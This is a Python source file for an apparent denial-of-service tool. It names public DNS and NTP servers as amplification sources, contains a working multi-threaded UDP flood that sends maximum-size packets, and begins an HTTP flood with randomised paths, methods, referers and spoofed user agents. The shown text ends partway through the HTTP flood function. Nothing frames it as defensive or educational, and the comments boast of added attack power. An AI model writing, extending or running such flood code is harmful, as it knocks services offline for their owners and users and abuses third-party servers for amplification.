# attack_methods.py
import time
import socket
import random
import threading
import ssl
import struct
import requests
from urllib.parse import urlparse
import dns.resolver
import socks
import cloudscraper
from queue import Queue
import http.client
import urllib3
from scapy.all import IP, TCP, UDP, ICMP, send, Raw
import subprocess

# Disable warnings for cleaner output
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Global variables for enhanced attacks
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0"
]

# Amplification servers for DNS and other amplification attacks
DNS_AMPLIFICATION_SERVERS = [
    "8.8.8.8", "8.8.4.4",  # Google DNS
    "1.1.1.1", "1.0.0.1",  # Cloudflare DNS
    "9.9.9.9", "149.112.112.112",  # Quad9 DNS
    "208.67.222.222", "208.67.220.220",  # OpenDNS
    "64.6.64.6", "64.6.65.6"  # Verisign DNS
]

NTP_AMPLIFICATION_SERVERS = [
    "time.google.com", "time.windows.com", "time.apple.com",
    "pool.ntp.org", "0.pool.ntp.org", "1.pool.ntp.org"
]

# Thread management - increased for more power
MAX_THREADS = 2000
active_threads = threading.Semaphore(MAX_THREADS)
thread_limiter = threading.BoundedSemaphore(MAX_THREADS)

def resolve_target(target):
    """Resolve a target (URL or IP) to IP address and port"""
    try:
        # If it's already an IP:port format
        if ":" in target and not target.startswith("http"):
            parts = target.split(":")
            if len(parts) == 2:
                return parts[0], int(parts[1])
        
        # Parse URL if it starts with http/https
        if target.startswith("http"):
            parsed = urlparse(target)
            hostname = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
            return hostname, port
        else:
            # Assume it's a domain without scheme
            hostname = target
            port = 80  # Default to port 80
            return hostname, port
    except Exception as e:
        raise ValueError(f"Could not resolve target: {target} - {str(e)}")

def attack_udp_god(target, duration):
    """Massive UDP flood with optimized performance"""
    ip, port = resolve_target(target)
    
    threads_count = 1000  # Increased thread count
    packet_size = 65500   # Maximum UDP packet size
    
    def flood():
        with active_threads:
            data = random._urandom(packet_size)
            end_time = time.time() + duration
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # Set socket options for maximum performance
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            except:
                pass
            
            while time.time() < end_time:
                try:
                    # Send multiple packets per iteration
                    for _ in range(100):
                        if time.time() >= end_time:
                            break
                        sock.sendto(data, (ip, port))
                except socket.error:
                    # Handle socket errors
                    try:
                        sock.close()
                    except:
                        pass
                    # Recreate socket
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    try:
                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
                    except:
                        pass
                except Exception:
                    time.sleep(0.01)
            
            try:
                sock.close()
            except:
                pass
    
    # Start threads
    threads = []
    for _ in range(threads_count):
        t = threading.Thread(target=flood)
        t.daemon = True
        threads.append(t)
        t.start()
    
    # Wait for duration
    time.sleep(duration)
    for t in threads:
        try:
            t.join(timeout=0.5)
        except:
            pass

def attack_http_flood(target, duration):
    """High-performance HTTP flood with connection pooling"""
    ip, port = resolve_target(target)
    use_ssl = port == 443
    
    threads_count = 800  # Increased thread count
    
    # Enhanced headers and paths
    paths = [
        "/", "/wp-admin.php", "/admin/login", "/api/v1/users",
        "/search", "/checkout", "/cart", "/product/123",
        "/user/profile", "/ajax/search", "/graphql", "/wp-json/wp/v2/posts",
        "/.env", "/config.php", "/phpinfo.php", "/adminer.php",
        "/mysql/admin", "/phpMyAdmin", "/database", "/api/json",
        "/autodiscover/autodiscover.xml", "/ecp/", "/owa/", "/api/"
    ]
    
    methods = ["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS", "TRACE", "PATCH", "CONNECT", "PROPFIND"]
    
    referers = [
        "https://www.google.com/", "https://www.bing.com/", "https://yandex.com/", 
        "https://facebook.com/", "https://twitter.com/", "https://reddit.com/",
        "https://www.youtube.com/", "https://www.amazon.com/", "https://www.netflix.com/"
    ]
    
    def build_request(target_host):
        method = random.choice(methods)
        path = random.choice(paths)
        
        headers = [
